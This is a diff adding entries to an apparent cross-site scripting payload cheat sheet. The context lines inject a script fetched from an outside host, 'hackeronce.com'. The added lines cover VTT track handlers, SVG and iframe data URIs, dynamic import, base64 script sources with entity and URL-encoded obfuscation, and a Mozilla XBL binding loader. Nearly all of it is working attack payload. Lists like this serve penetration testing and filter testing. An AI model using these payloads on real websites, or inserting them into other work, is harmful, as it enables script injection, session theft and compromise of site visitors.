@@ -34,3 +34,32 @@ Create Element
 javascript:eval('var a=document.createElement(\'script\');a.src=\'//1.hackeronce.com\';document.body.appendChild(a)')
 Plain JS
 document.head.appendChild(Object.assign(document.createElement('script'),{src:'//1.hackeronce.com'}));
+
+<!-- VTT track XSS -->
+<video controls><source src=validvideo.mp4 type=video/mp4><track default oncuechange=alert(1) src="data:text/vtt,WEBVTT FILE
+
+1
+00:00:00.000 --> 00:00:05.000
+<b>XSS</b>
+"></video>
+
+<!-- SVG script href XSS -->
+<svg><script href="data:text/javascript,alert(1)" />
+
+<!-- Script import XSS -->
+<script>import('data:text/javascript,alert(1)')</script>
+
+<!-- Script src data URI XSS -->
+<script src=data:text/javascript;base64,YWxlcnQoMSk=></script>
+
+<!-- Script src data URI with HTML entities XSS -->
+<script src=data:text/javascript;base64,&#x59;&#x57;&#x78;&#x6c;&#x63;&#x6e;&#x51;&#x6f;&#x4d;&#x53;&#x6b;&#x3d;></script>
+
+<!-- Script src data URI with URL encoding XSS -->
+<script src=data:text/javascript;base64,%59%57%78%6c%63%6e%51%6f%4d%53%6b%3d></script>
+
+<!-- Iframe src data URI XSS -->
+<iframe src="data:text/html,<img src=1 onerror=alert(document.domain)>"></iframe>
+
+<!-- Moz binding XSS -->
+<img src="blah" style="-moz-binding: url(data:text/xml;charset=utf-8,%3C%3Fxml%20version%3D%221.0%22%3F%3E%3Cbindings%20xmlns%3D%22 http%3A//www.mozilla.org/xbl%22%3E%3Cbinding%20id%3D%22loader%22%3E%3Cimplementation%3E%3Cconstructor%3E%3C%21%5BCDATA%5Bvar%20url%20%3D%20%22alert.js %22%3B%20var%20scr%20%3D%20document.createElement%28%22script%22%29%3B%20scr.setAttribute%28%22src%22%2Curl%29%3B%20var%20bodyElement%20%3D%20 document.getElementsByTagName%28%22html%22%29.item%280%29%3B%20bodyElement.appendChild%28scr%29%3B%20%5D%5D%3E%3C/constructor%3E%3C/implementation%3E%3C/ binding%3E%3C/bindings%3E)" />
